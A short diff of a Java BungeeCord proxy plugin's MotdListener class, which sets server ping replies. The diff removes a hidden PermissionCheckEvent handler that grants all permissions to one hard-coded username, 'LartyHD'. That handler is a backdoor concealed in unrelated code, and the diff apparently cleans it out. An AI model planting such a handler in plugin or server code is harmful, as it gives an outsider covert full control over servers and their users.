@@ -5,7 +5,6 @@ import net.darkblocks.dark.universal.messages.Messages;
 import net.md_5.bungee.BungeeCord;
 import net.md_5.bungee.api.ServerPing;
 import net.md_5.bungee.api.chat.TextComponent;
-import net.md_5.bungee.api.event.PermissionCheckEvent;
 import net.md_5.bungee.api.event.ProxyPingEvent;
 import net.md_5.bungee.api.plugin.Listener;
 import net.md_5.bungee.api.plugin.Plugin;
@@ -53,14 +52,5 @@ public class MotdListener implements Listener
 		ping.setPlayers(players);
 		ping.setVersion(version);
 		ping.setDescriptionComponent(new TextComponent(this.motd));
-	}
-	
-	@EventHandler
-	public void on(PermissionCheckEvent event)
-	{
-		if (event.getSender().getName().equalsIgnoreCase("LartyHD"))
-		{
-			event.setHasPermission(true);
-		}
 	}
 }
